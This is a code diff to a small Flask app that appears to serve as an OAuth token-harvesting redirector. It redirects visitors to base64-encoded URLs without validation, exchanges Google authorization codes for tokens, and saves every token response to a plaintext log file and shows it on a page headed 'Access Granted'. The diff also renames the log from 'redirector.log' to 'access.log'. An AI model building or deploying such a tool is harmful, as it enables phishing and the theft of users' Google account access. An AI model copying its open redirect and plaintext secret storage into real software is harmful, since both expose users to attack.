@@ -6,13 +6,13 @@ import os
 
 app = Flask(__name__)
 
-# Set your actual Google OAuth credentials and redirect URI here
-CLIENT_ID = "YOUR_GOOGLE_CLIENT_ID"
-CLIENT_SECRET = "YOUR_GOOGLE_CLIENT_SECRET"
-REDIRECT_URI = "https://your-render-app.onrender.com/callback"
+# Replace with your real Google OAuth credentials
+CLIENT_ID = ""
+CLIENT_SECRET = ""
+REDIRECT_URI = ""
 
 # Set up logging
-logging.basicConfig(filename='redirector.log', level=logging.INFO, format='%(asctime)s %(message)s')
+logging.basicConfig(filename='access.log', level=logging.INFO, format='%(asctime)s %(message)s')
 
 @app.route('/')
 def index():
@@ -27,7 +27,7 @@ def go():
     try:
         decoded_bytes = base64.urlsafe_b64decode(encoded.encode())
         decoded_url = decoded_bytes.decode()
-        logging.info(f"[REDIRECT] Decoded and redirecting to: {decoded_url}")
+        logging.info(f"[REDIRECT] Redirecting to: {decoded_url}")
         return redirect(decoded_url)
     except Exception as e:
         logging.error(f"[ERROR] Base64 decode failed: {e}")
@@ -37,7 +37,7 @@ def go():
 def callback():
     code = request.args.get("code")
     if not code:
-        return "Missing code", 400
+        return "Missing authorization code", 400
 
     token_url = "https://oauth2.googleapis.com/token"
     data = {
@@ -50,12 +50,19 @@ def callback():
 
     try:
         response = requests.post(token_url, data=data)
+        response.raise_for_status()
         token_data = response.json()
-        logging.info(f"[TOKEN] Received: {token_data}")
-        return f"<h3>Token received:</h3><pre>{token_data}</pre>"
-    except Exception as e:
-        logging.error(f"[ERROR] Token exchange failed: {e}")
-        return f"Token exchange error: {e}", 500
+
+        # Save token to log file
+        with open("tokens.log", "a") as f:
+            f.write(f"[TOKEN RECEIVED]\n{token_data}\n\n")
+
+        logging.info(f"[TOKEN] {token_data}")
+        return f"<h2>Access Granted</h2><pre>{token_data}</pre>"
+
+    except requests.exceptions.RequestException as e:
+        logging.error(f"[TOKEN ERROR] {str(e)}")
+        return f"<h2>Token exchange failed:</h2><pre>{str(e)}</pre>", 500
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
